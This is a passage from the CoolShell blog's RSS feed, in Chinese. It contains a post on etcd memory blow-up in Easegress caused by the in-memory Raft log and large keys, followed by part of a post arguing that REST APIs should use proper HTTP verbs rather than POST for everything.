+<p>Zookeeper是一个很流行的开源软件，也被用于各大公司的生产线，包括一些开源软件，比如：Kafka。但是，这会让其它软件有一个依赖，并且在运维上带来很大的复杂度。所以，Kafka在最新的版本也通过内置了选主的算法，而抛弃了外挂zookeeper的设计。Etcd是Go语言社区这边的主力，也是kubernetes组建集群的关键组件。Easegress在一开始（5年前）使用了gossip协议同步状态（当时想的过于超前，想做广域网的集群），但是后发现这个协议太过于复杂，而且很难调试，而广域网的API Gateway也没遇到相应的场景。所以，在3年前的时候，为了稳定性的考量，我们把其换成了内嵌版本的etcd，这个设计一直沿用到今天。</p>
+<p>Easegress会把所有的配置信息都放到etcd里，还包括一些统计监控数据，以及一些用户的自定义数据（这样用户自己的plugin不但可以在一条pipeline内，还可以在整个集群内共享数据），这对于用户进行扩展来说是非常方便的。软件代码的扩展性一直是我们追求的首要目标，尤其是开源软件更要想方设法降低技术门槛让技术易扩展，这就是为什么Google的很多开源软件都会选使用Go语言的原因，也是为什么Go正在取代C/C++的做PaaS基础组件的原因。</p>
+<h4>背景问题</h4>
+<p>好了，在介绍完为什么要用etcd以后，我开始分享一个实际的问题了。我们有个用户在使用 Easegress 的时候，在Easegress内配置了上千条pipeline，导致 Easegress的内存飙升的非常厉害- 10+GB 以上，而且长时间还下不来。</p>
+<p>用户报告的问题是——</p>
+<blockquote><p>在Easegress 1.4.1 上创建一个HTTP对象，1000个Pipeline，在Easegres初始化启动完成时的内存占用大概为400M，运行80分钟后2GB，运行200分钟后达到了4GB，这期间什么也没有干，对Easegress没有进行过一次请求。</p></blockquote>
+<p>一般来说，就算是API再多也不应该配置这么多的处理管道pipeline的，通常我们会使用HTTP API的前缀把一组属于一个类别的API配置在一个管道内是比较合理的，就像nginx下的location的配置，一般来说不会太多的。但是，在用户的这个场景下配置了上千个pipeline，我们也是头一次见，应该是用户想做更细粒度的控制。</p>
+<p>经过调查后，我们发现内存使用基本全部来自etcd，我们实在没有想到，因为我们往etcd里放的数据也没有多少个key，感觉不会超过10M，但不知道为什么会占用了10GB的内存。这种时候，一般会怀疑etcd有内存泄漏，上etcd上的github上搜了一下，发现etcd在3.2和3.3的版本上都有内存泄露的问题，但都修改了，而 Easegress 使用的是3.5的最新版本，另外，一般来说内存泄漏的问题不会是这么大的，我们开始怀疑是我们哪里误用了etcd。要知道是否误用了etcd，那么只有一条路了，沉下心来，把etcd的设计好好地看一遍。</p>
+<div class="p-rich_text_section">
+<p>大概花了两天左右的时间看了一下etcd的设计，我发现了etcd有下面这些消耗内存的设计，老实说，还是非常昂贵的，这里分享出来，避免后面的同学再次掉坑。</p>
+<p><b data-stringify-type="bold">首当其冲是——RaftLog</b>。etcd用Raft Log，主要是用于帮助follower同步数据，这个log的底层实现不是文件，而是内存。所以，而且还至少要保留 <code>5000</code> 条最新的请求。如果key的size很大，这 <code>5000</code>条就会产生大量的内存开销。比如，不断更新一个 1M的key，哪怕是同一个key，这 5000 条Log就是 5000MB = 5GB 的内存开销。这个问题在etcd的issue列表中也有人提到过  <a href="https://github.com/etcd-io/etcd/issues/12548" target="_blank" rel="noopener">issue #12548 </a>，不过，这个问题不了了之了。这个5000还是一个hardcode，无法改。（参看 <code>DefaultSnapshotCatchUpEntries</code> <a class="c-link" tabindex="-1" href="https://github.com/etcd-io/etcd/blob/29c3b0f307107fd95a6eb43ddff20db952eeb2fa/server/etcdserver/server.go#L80" target="_blank" rel="noopener noreferrer" data-stringify-link="https://github.com/etcd-io/etcd/blob/29c3b0f307107fd95a6eb43ddff20db952eeb2fa/server/etcdserver/server.go#L80" data-sk="tooltip_parent" data-remove-tab-index="true">相关源码</a>）</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">// DefaultSnapshotCatchUpEntries is the number of entries for a slow follower
+// to catch-up after compacting the raft storage entries.
+// We expect the follower has a millisecond level latency with the leader.
+// The max throughput is around 10K. Keep a 5K entries is enough for helping
+// follower to catch up.
+DefaultSnapshotCatchUpEntries uint64 = 5000</pre>
+<p>另外，我们还发现，这个设计在历史上etcd的官方团队把这个默认值从10000降到了5000，我们估计etcd官方团队也意识到10000有点太耗内存了，所以，降了一半，但是又怕follwer同步不上，所以，保留了 5000条……（在这里，我个人感觉还有更好的方法，至少不用全放在内存里吧……）</p>
+<p>另外还有下面几项也会导致etcd的内存会增加</p>
+<ol class="p-rich_text_list p-rich_text_list__ordered" data-stringify-type="ordered-list" data-indent="0" data-border="0">
+<li data-stringify-indent="0" data-stringify-border="0"><strong>索引</strong>。etcd的每一对 key-value 都会在内存中有一个 B-tree 索引。这个索引的开销跟key的长度有关，etcd还会保存版本。所以B-tree的内存跟key的长度以及历史版本号数量也有关系。</li>
+<li data-stringify-indent="0" data-stringify-border="0"><b data-stringify-type="bold">mmap</b>。还有，etcd 使用 mmap 这样上古的unix技术做文件映射，会把他的blotdb的内存map到虚拟内存中，所以，db-size越大，内存越大。</li>
+<li data-stringify-indent="0" data-stringify-border="0"><b data-stringify-type="bold">Watcher</b>。watch也会占用很大的内存，如果watch很多，连接数多，都会堆积内存。</li>
+</ol>
+<p>（很明显，etcd这么做就是为了一个高性能的考虑）</p>
+<div class="p-rich_text_section">
+<p>Easegress中的问题更多的应该是Raft Log 的问题。后面三种问题我们觉得不会是用户这个问题的原因，对于索引和mmap，使用 <a href="https://etcd.io/docs/v3.2/op-guide/maintenance/" target="_blank" rel="noopener">etcd 的 compact 和 defreg</a> （压缩和碎片整理应该可以降低内存，但用户那边不应该是这个问题的核心原因）。</p>
+<p>针对用户的问题，大约有1000多条pipeline，因为Easegress会对每一条pipeline进行数据统计（如：M1, M5, M15， P99, P90, P50等这样的统计数据），统计信息可能会有1KB-2KB左右，但Easegress会把这1000条pipeline的统计数据合并起来写到一个key中，这1000多条的统计数据合并后会导致出现一个平均尺寸为2MB的key，而5000个in-memory的RaftLog导致etcd要消耗了10GB的内存。之前没有这么多的pipeline的场景，所以，这个内存问题没有暴露出来。</p>
+<p>于是，我们最终的解决方案也很简单，我们修改我们的策略，不再写这么大的Value的数据了，虽然以前只写在一个key上，但是Key的值太大，现在把这个大Key值拆分成多个小的key来写，这样，实际保存的数据没有发生变化，但是RaftLog的每条数据量就小了，所以，以前是5000条 2M（10GB），现在是5000条 1K（500MB），就这样解决了这个问题。相关的PR在这里 <a href="https://github.com/megaease/easegress/pull/542" target="_blank" rel="noopener">PR#542</a> 。</p>
+<h4>总结</h4>
+<p>要用好 etcd，有如下的实践</p>
+<ul>
+<li>避免大尺寸的key和value，一方面会通过一个内存级的 Raft Log 占大量内存，另一方面，B-tree的多版本索引也会因为这样耗内存。</li>
+<li>避免DB的尺寸太大，并通过 compact和defreg来压缩和碎片整理降低内存。</li>
+<li>避免大量的Watch Client 和 Watch数。这个开销也是比较大的。</li>
+<li>最后还有一个，就是尽可能使用新的版本，无论是go语言还是etcd，这样会少很多内存问题。比如：golang的这个跟LInux内核心相关的<a href="https://github.com/golang/go/issues/42330" target="_blank" rel="noopener">内存问题</a> —— golang 1.12的版sget的是 <code>MADV_FREE</code> 的内存回收机制，而在1.16的时候，改成了 <code>MADV_DONTNEED</code> ，这两者的差别是，<code>FREE</code>表示，虽然进程标记内存不要了，但是操作系统会保留之，直到需要更多的内存，而 <code>DONTNEED</code> 则是立马回收，你可以看到，在常驻内存RSS 上，前者虽然在golang的进程上回收了内存，但是RSS值不变，而后者会看到RSS直立马变化。Linux下对 <code>MADV_FREE</code> 的实现在某些情况下有一定的问题，所以，在go 1.16的时候，默认值改成了 <code>MADV_DONTNEED</code> 。而 etcd 3.4 是用 来1.12 编译的。</li>
+</ul>
+<p>最后，欢迎大家关注我们的开源软件！ <a href="https://github.com/megaease/" target="_blank" rel="noopener">https://github.com/megaease/ </a></p>
+<div class="p-rich_text_section">
+<p>（全文完）</p>
+</div>
+</div>
+</div>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/21615.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png" alt="Go编程模式 ： 泛型编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21615.html" class="wp_rp_title">Go编程模式 ： 泛型编程</a></li><li ><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png" alt="Go 编程模式：k8s Visitor 模式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_title">Go 编程模式：k8s Visitor 模式</a></li><li ><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png" alt="Go编程模式：Pipeline" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_title">Go编程模式：Pipeline</a></li><li ><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png" alt="Go编程模式：委托和反转控制" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_title">Go编程模式：委托和反转控制</a></li><li ><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png" alt="Go 编程模式：Go Generation" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_title">Go 编程模式：Go Generation</a></li><li ><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png" alt="Go编程模式：Map-Reduce" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_title">Go编程模式：Map-Reduce</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22242.html">ETCD的内存问题</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22242.html/feed</wfw:commentRss>
+			<slash:comments>39</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>“一把梭：REST API 全用 POST”</title>
+		<link>https://coolshell.cn/articles/22173.html</link>
+					<comments>https://coolshell.cn/articles/22173.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sun, 13 Feb 2022 04:28:47 +0000</pubDate>
+				<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[HTTP]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[Restful]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22173</guid>
+
+					<description><![CDATA[<p>写这篇文章的原因主要还是因为V2EX上的这个贴子，这个贴子中说—— “对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22173.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22173.html">“一把梭：REST API 全用 POST”</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright wp-image-22176" src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-300x169.png" alt="" width="325" height="183" srcset="https://coolshell.cn/wp-content/uploads/2022/02/http_method-300x169.png 300w, https://coolshell.cn/wp-content/uploads/2022/02/http_method-1024x576.png 1024w, https://coolshell.cn/wp-content/uploads/2022/02/http_method-768x432.png 768w, https://coolshell.cn/wp-content/uploads/2022/02/http_method-480x270.png 480w, https://coolshell.cn/wp-content/uploads/2022/02/http_method.png 1200w" sizes="(max-width: 325px) 100vw, 325px" /></p>
+<p>写这篇文章的原因主要还是因为V2EX上的这个<a href="https://www.v2ex.com/t/830030?p=1" target="_blank" rel="noopener">贴子</a>，这个贴子中说——</p>
+<blockquote><p>“对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更安全，之前习惯使用 restful api ，如果说 https 只有 post 请求是安全的话？那为啥还需要 get 、put 、delete ？我该如何反驳他。”</p></blockquote>
+<p>然后该贴中大量的回复大概有这么几种论调，1）POST挺好的，就应该这么干，沟通少，2）一把梭，早点干完早点回家，3）吵赢了又怎么样？工作而已，优雅不能当饭吃。虽然评论没有一边倒，但是也有大量的人支持。然后，我在Twitter上嘲讽了一下，用POST干一切就像看到了来你家装修工人说，“老子干活就是用钉子钉一切，什么螺丝、螺栓、卡扣、插销……通通不用，钉枪一把梭，方便，快捷，安全，干完早回家……不过，还是有一些网友觉得用POST挺好的，而且可以节约时间。所以，正好，我在《<a title="我做系统架构的一些原则" href="https://coolshell.cn/articles/21672.html" target="_blank" rel="noopener">我做系统架构的原则</a>》中的“<a href="https://coolshell.cn/articles/21672.html#%E5%8E%9F%E5%88%99%E4%BA%94%EF%BC%9A%E5%88%B6%E5%AE%9A%E5%B9%B6%E9%81%B5%E5%BE%AA%E6%9C%8D%E4%BB%8E%E6%A0%87%E5%87%86%E3%80%81%E8%A7%84%E8%8C%83%E5%92%8C%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5" target="_blank" rel="noopener">原则五</a>”中反对API返回码无论对错全是200的返回那，我专门写下这一篇文章，以正视听。</p>
+<p>这篇文章主要分成下面这几个部分：</p>
+<ol>
+<li>为什么要用不同的HTTP动词？</li>
+<li>Restful 进行复杂查询</li>
+<li>几个主要问题的回应
+<ul>
+<li>POST 更安全吗？</li>
+<li>全用 POST 可以节省时间沟通少吗？</li>
+<li>早点回家的正确姿势</li>
+<li>工作而已，优雅不能当饭吃</li>
+</ul>
+</li>
+</ol>
+<p><span id="more-22173"></span></p>
+<h4>为什么要用不同的HTTP动词</h4>
+<p>编程世界通常来说有两种逻辑：“<strong>业务逻辑</strong>” 和 “<strong>控制逻辑</strong>”。</p>
+<ul>
+<li><strong>业务逻辑</strong>。就是你实现业务需求的功能的代码，就是跟用户需求强相关的代码。比如，把用户提交的数据保存起来，查询用户的数据，完成一个订单交易，为用户退款……等等，这些是业务逻辑</li>
+<li><strong>控制逻辑</strong>。就是我们用于控制程序运行的非功能性的代码。比如，用于控制程序循环的变量和条件，使用多线程或分布式的技术，使用HTTP/TCP协议，使用什么样数据库，什么样的中间件……等等，这些跟用户需求完全没关系的东西。</li>
+</ul>
+<p>网络协议也是一样的，一般来说，<strong>几乎所有的主流网络协议都有两个部分，一个是协议头，一个是协议体。协议头中是协议自己要用的数据，协议体才是用户的数据。所以，协议头主要是用于协议的控制逻辑，而协议体则是业务逻辑。</strong></p>
+<p>HTTP的动词（或是Method）是在协议头中，所以，其主要用于控制逻辑。</p>
+<p dir="auto">下面是HTTP的动词规范，一般来说，REST API 需要开发人员严格遵循下面的标准规范（参看<a href="https://www.rfc-editor.org/rfc/rfc7231#section-4.2.2" target="_blank" rel="noopener">RFC7231 章节4.2.2 &#8211; Idempotent Methods</a>）</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+<th>幂等</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>用于查询操作，对应于数据库的 <code>select</code> 操作</td>
+<td style="text-align: center;"><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png" alt="✔" class="wp-smiley" style="height: 1em; max-height: 1em;" />︎</td>
+</tr>
+<tr>
+<td>PUT</td>
+<td>用于所有的信息更新，对应于数据库的 <code>update </code>操作</td>
+<td style="text-align: center;"><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png" alt="✔" class="wp-smiley" style="height: 1em; max-height: 1em;" />︎︎</td>
+</tr>
+<tr>
+<td>DELETE</td>
+<td>用于更新操作，对应于数据库的 <code>delete</code> 操作</td>
+<td style="text-align: center;"><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png" alt="✔" class="wp-smiley" style="height: 1em; max-height: 1em;" />︎︎</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>用于新增操作，对应于数据库的 <code>insert</code> 操作</td>
+<td style="text-align: center;">✘</td>
+</tr>
+<tr>
+<td>HEAD</td>
+<td>用于返回一个资源对象的“元数据”，或是用于探测API是否健康</td>
+<td style="text-align: center;"><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png" alt="✔" class="wp-smiley" style="height: 1em; max-height: 1em;" />︎</td>
+</tr>
+<tr>
+<td>PATCH</td>
+<td>用于局部信息的更新，对应于数据库的 <code>update</code> 操作</td>
+<td style="text-align: center;">✘</td>
+</tr>
+<tr>
+<td>OPTIONS</td>
+<td>获取API的相关的信息。</td>
+<td style="text-align: center;"><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png" alt="✔" class="wp-smiley" style="height: 1em; max-height: 1em;" />︎</td>
+</tr>
+</tbody>
+</table>
+<p>其中，<code>PUT</code> 和 <code>PACTH</code> 都是更新业务资源信息，如果资源对象不存在则可以新建一个，但他们两者的区别是，<code>PUT</code> 用于更新一个业务对象的所有完整信息，就像是我们通过表单提交所有的数据，而 <code>PACTH</code> 则对更为API化的数据更新操作，只需要更需要更新的字段（参看 <a href="http://tools.ietf.org/html/rfc5789" rel="nofollow">RFC 5789</a> ）。</p>
+<p>当然，现实世界中，可能并不一定严格地按照数据库操作的CRUD来理解API，比如，你有一个登录的API <code>/login</code> 你觉得这个API应该是 <code>GET</code> ，<code>POST</code>，<code>PUT</code> 还是 <code>PATCH</code> ?登录的时候用户需要输入用户名和密码，然后跟数据库里的对比（select操作）后反回一个登录的session token，然后这个token作为用户登录的状态令牌。如果按上面表格来说，应该是 select 操作进行 <code>GET</code> ，但是从语义上来说，登录并不是查询信息，应该是用户状态的更新或是新增操作（新增session），所以还是应该使用 <code>POST</code>，而 <code>/logout</code> 你可以使用 <code>DELETE</code> 。<strong>这里相说明一下，不要机械地通过数据库的CRUD来对应这些动词，很多时候，还是要分析一下业务语义。</strong></p>
+<p><strong>另外，我们注意到，在这个表格的最后一列中加入了“是否幂等”的，API的幂等对于控制逻辑来说是一件很重要的事。</strong>所谓幂等，就是该API执行多次和执行一次的结果是完全一样的，没有副作用。</p>
+<ul>
+<li><code>POST</code> 用于新增加数据，比如，新增一个交易订单，这肯定不能是幂等的</li>
+<li><code>DELETE</code> 用于删除数据，一个数据删除多次和删除一次的结果是一样的，所以，是幂等的</li>
+<li><code>PUT</code> 用于全部数更新，所以，是幂等的。</li>
+<li><code>PATCH</code>用于局部更新，比如，更新某个字段 cnt = cnt+1，明显不可能是幂等操作。</li>
+</ul>
+<p>幂等这个特性对于远程调用是一件非常关键的事，就是说，远程调用有很多时候会因为网络原因导致调用timeout，对于timeout的请求，我们是无法知道服务端是否已经是收到请求并执行了，此时，我们不能贸然重试请求，对于不是幂等的调用来说，这会是灾难性的。比如像转帐这样的业务逻辑，转一次和转多次结果是不一样的，如果重新的话有可能就会多转了一次。所以，这个时候，如果你的API遵从了HTTP动词的规范，那么你写起程序来就可以明白在哪些动词下可以重试，而在哪些动词下不能重试。如果你把所有的API都用POST来表达的话，就完全失控了。</p>
+<p>除了幂等这样的控制逻辑之外，你可能还会有如下的这些控制逻辑的需求：</p>
+<ul>
+<li><strong>缓存</strong>。通过CDN或是网关对API进行缓存，很显然，我们要在查询<code>GET</code> 操作上建议缓存。</li>
+<li><strong>流控</strong>。你可以通过HTTP的动词进行更粒度的流控，比如：限制API的请用频率，在读操作上和写操作上应该是不一样的。</li>
+<li><strong>路由</strong>。比如：写请求路由到写服务上，读请求路由到读服务上。</li>
+<li><strong>权限</strong>。可以获得更细粒度的权限控制和审计。</li>
+<li><strong>监控</strong>。因为不同的方法的API的性能都不一样，所以，可以区分做性能分析。</li>
+<li><strong>压测</strong>。当你需要压力测试API时，如果没有动词的区分的话，我相信你的压力测试很难搞吧。</li>
+<li>……等等</li>
+</ul>
+<p>也许，你会说，我的业务太简单了，没有必要搞这么复杂。OK，没有问题，但<strong>是我觉得你最差的情况下，也是需要做到“读写分离”的，就是说，至少要有两个动词，<code>GET</code> 表示是读操作，<code>POST</code>表示是写操作。</strong></p>
+<h4>Restful 复杂查询</h4>
+<p>一般来说，对于查询类的API，主要就是要完成四种操作：排序，过滤，搜索，分页。下面是一些相关的规范。参考于两个我觉得写的最好的Restful API的规范文档，<a href="https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md" target="_blank" rel="noopener">Microsoft REST API Guidelines</a>，<a href="https://github.com/paypal/api-standards/blob/master/api-style-guide.md" target="_blank" rel="noopener">Paypal API Design Guidelines</a>。</p>
+<ul dir="auto">
+<li>
+<p dir="auto"><strong>排序</strong>。对于结果集的排序，使用 <code>sort</code> 关键字，以及 <code>{field_name}|{asc|desc},{field_name}|{asc|desc}</code> 的相关语法。比如，某API需要返回公司的列表，并按照某些字段排序，如：<code>GET /admin/companies?sort=rank|asc</code> 或是 <code>GET /admin/companies?sort=rank|asc,zip_code|desc</code></p>
+</li>
+<li>
+<p dir="auto"><strong>过滤</strong>。对于结果集的过滤，使用 <code>filter</code> 关键字，以及 <code>{field_name} op{value}</code> 的语法。比如： <code>GET /companies?category=banking&amp;location=china</code> 。但是，有些时候，我们需要更为灵活的表达式，我们就需要在URL上构造我们的表达式。这里需要定义六个比较操作：<code>=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&lt;=</code>，<code>&gt;=</code>，以及三个逻辑操作：<code>and</code>，<code>or</code>，<code>not</code>。（表达式中的一些特殊字符需要做一定的转义，比如：<code>&gt;=</code> 转成 <code>ge</code>）于是，我们就会有如下的查询表达式：<code>GET /products?$filter=name eq 'Milk' and price lt 2.55</code> 查找所有的价柗小于2.55的牛奶。</p>
+</li>
+<li>
+<p dir="auto"><strong>搜索</strong>。对于相关的搜索，使用 <code>search</code> 关键字，以及关键词。如：<code>GET /books/search?description=algorithm</code> 或是直接就是全文搜索 <code>GET /books/search?key=algorithm</code> 。</p>
+</li>
+<li>
+<p dir="auto"><strong>分页</strong>。对于结果集进行分页处理，分页必需是一个默认行为，这样不会产生大量的返回数据。</p>
+<ul dir="auto">
+<li>使用<code>page</code>和<code>per_page</code>代表页码和每页数据量，比如：<code>GET /books?page=3&amp;per_page=20</code>。</li>
+<li><strong>可选</strong>。上面提到的<code>page</code>方式为使用相对位置来获取数据，可能会存在两个问题：性能（大数据量）与数据偏差（高频更新）。此时可以使用绝对位置来获取数据：事先记录下当前已获取数据里最后一条数据的<code>ID</code>、<code>时间</code>等信息，以此获取 “<strong>该ID之前的数据</strong>” 或 “<strong>该时刻之前的数据</strong>”。示例：<code>GET /news?max_id=23454345&amp;per_page=20</code> 或 <code>GET /news?published_before=2011-01-01T00:00:00Z&amp;per_page=20</code>。
+<p dir="auto">
+</li>
+</ul>
+</li>
+</ul>
+<p dir="auto"><strong>注意：这里需要注意一下，在理论上来说<code>GET</code>是可以带 body 的，但是很多程序的类库或是中间件并不支持 GET 带 body，导致你只能用 POST 来传递参数。这里的原则是：</strong></p>
+<ol dir="auto">
+<li>
+<p dir="auto"><strong>对于简单的查询，很多参数都设计在 restful API 的路径上了，而 filter/sort/pagination 也不会带来很多的复杂，所以应该使用 <code>GET</code> </strong></p>
+</li>
+<li><strong>对于复杂的查询来说，可能会有很复杂的查询参数，比如：ElasticSearch 上的 <code>index/_search</code>里的 DSL，你也应该尽可能的使用 <code>GET</code>，而不是<code>POST</code> 除非客观条件上不支持<code>GET</code>。ElasticSearch 的<a href="https://www.elastic.co/guide/en/elasticsearch/guide/current/_empty_search.html" target="_blank" rel="noopener">官方文档</a>里也是这么说的。</strong></li>
+</ol>
+<blockquote><p>The authors of Elasticsearch prefer using GET for a search request because they feel that it describes the action—​retrieving information—​better than the POST verb. （我们推荐使用 GET而不是 POST，因为语义更清楚）However, because GET with a request body is not universally supported, the search API also accepts POST requests （除非你的类库或是服务器不支持 GET带参数 ，你再用POST，我们两个都支持）</p>
+<p><strong>陈皓注：但是在 ElasticSearch 7.11 后，GET 也不支持 body 了。这是 ElasticSearch 的设计和实现不对应了。</strong></p></blockquote>
+<div id="message-accessories-1073072655571370085" class="container-2sjPya">
+<div class="messageAttachment-CZp8Iv messageAttachmentNoJustify-lIzP9c">
+<div class="imageContent-3Av-9c embedWrapper-1MtIDg attachmentContentItem-UKeiCx">
+<div class="imageContainer-10XenG">
+<div class="imageWrapper-oMkQl4 imageZoom-3yLCXY clickable-LksVCf">另外，对于一些更为复杂的操作，建议通过分别调用多个API的方式来完成，虽然这样会增加网络请求的次数，但是这样的可以让后端程序和数据耦合度更小，更容易成为微服务的架构。</div>
+</div>
+</div>
+</div>
+</div>
+<p>最后，如果你想在Rest中使用像GraphQL那样的查询语言，你可以考虑一下类似 <a href="https://www.odata.org/" target="_blank" rel="noopener">OData</a> 的解决方案。OData 是 Open Data Protocol 的缩写，最初由 Microsoft 于 2007 年开发。它是一种开放协议，使您能够以简单和标准的方式创建和使用可查询和可互操作的 RESTful API。</p>
+<h4>几个主要问题的回应</h4>
+<p>下面是对几个问题的直接回应，如果大家需要我回应更多的问题，可以在后面留言，我会把问题和我的回应添加到下面。</p>
+<h5>1）为什么API 要Restful，并符合规范？</h5>
+<p><strong>Restful API算是一个HTTP的规范和标准了，你要说是最佳实践也好，总之，它是一个全世界对HTTP API的一个共识。在这个共识上，你可以无成本地享受很多的技术红利，比如：CDN，API网关，服务治理，监控……等等。这些都是可以让你大幅度降低研发成本，避免踩坑的原因。</strong></p>
+<h5>2）为什么“过早优化”不适用于API设计？</h5>
+<p>因为API是一种契约，一旦被使用上，就很难再变更了，就算你发行新的版本的API，你还要驱动各种调用方升级他们的调用方式。所以，接口设计就像数据库模式设计一下，一旦设计好了，未来再变更就比较难了。所以，还是要好好设计。正如前面我给的几个文档——<a href="https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md" target="_blank" rel="noopener">Microsoft REST API Guidelines</a>，<a href="https://github.com/paypal/api-standards/blob/master/api-style-guide.md" target="_blank" rel="noopener">Paypal API Design Guidelines</a> 或是 <a href="https://cloud.google.com/apis/design" target="_blank" rel="noopener">Google API Design Guide</a> 都是让你好好设计API的不错的 Guidelines.</p>
+<h5>3）POST 更安全吗？</h5>
+<p>不会。</p>
+<p>很多同学以为 <code>GET</code> 的请求数据在URL中，而 <code>POST</code> 的则不是，所以以为 <code>POST</code> 更安全。不是这样的，整个请求的HTTP URL PATH会全部封装在HTTP的协议头中。只要是HTTPS，就是安全的。当然，有些网关如nginx会把URL打到日志中，或是会放在浏览器的历史记录中，所以有人会说 <code>GET</code> 请求不安全，但是，<code>POST</code> 也没有好到哪里去，在 <a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" target="_blank" rel="noopener">CSRF</a> 这个最常见的安全问题上，则完全就是针对 <code>POST</code> 的。  安全是一件很复杂的事，无论你用哪方法或动词都会不能代表你会更安全。</p>
+<p>另外，</p>
+<ul>
+<li>如果你要 防止你的 <code>GET</code> 上有敏感信息，应该加个密，这个跟 <code>POST</code>是一样的。</li>
+<li>如果你要防止 <code>GET</code> 会被中间人修改，你应该做一个URL签名。（通常来说， 我们都在 <code>GET</code> 上做签名，<code>POST</code> 就忘做了）</li>
+<li>如果你要防止有人发一些恶意链接来 hack 你的用户（传说中的 <code>GET</code> 不如 <code>POST</code> 安全的一个问题），你应该用 HMAC 之类的认证技术做好认证（参看 <a title="HTTP API 认证授权术" href="https://coolshell.cn/articles/19395.html" target="_blank" rel="noopener">HTTP API 认证授权术</a>）。</li>
+</ul>
+<p>总之，你要明白，<code>GET</code> 和 <code>POST</code> 的安全问题都一样的，不要有谁比谁更安全，然后你就可以掉以轻心的这样的想法，安全都是要很严肃对待的。</p>
+<h5>4）全用 POST 可以节省时间减少沟通吗？</h5>
+<p>不但不会，反而更糟糕。</p>
+<p>说这种话的人，我感觉是不会思考问题。</p>
+<ul>
+<li>其一，为API赋于不同的动词，这个几乎不需要时间。把CRUD写在不同的函数下也是一种很好的编程风格。另外现在几乎所有的开发框架都支持很快速的CRUD的开发，比如Spring Boot，写数据库的CRUD基本上就不需要写SQL语言相关的查询代码，非常之方便。</li>
+<li>其二，使用规范的方式，可以节约新加入团队人员的学习成本，而且可以大大减少跨团队的沟能成本。规范和标准其实就是在节约团队时间提升整体效率的，这个我们整个人类进行协作的基础。所以，这个世界上有很多的标准，你只要照着这个标准来，你的所生产的零件就可以适配到其它厂商的产品上。而不需要相互沟通。</li>
+<li>其三，全用POST接口一把梭，不规范不标准，使用你的这个山寨API的人就得来不断的问你，反而增加了沟通。另外，也许你开发业务功能很快了，但是你在做控制逻辑的时候，你就要返工了，从长期上来讲，你的欠下了技术债，这个债反而导致了更大的成本。</li>
+</ul>
+<h5>5）早点回家的正确姿势</h5>
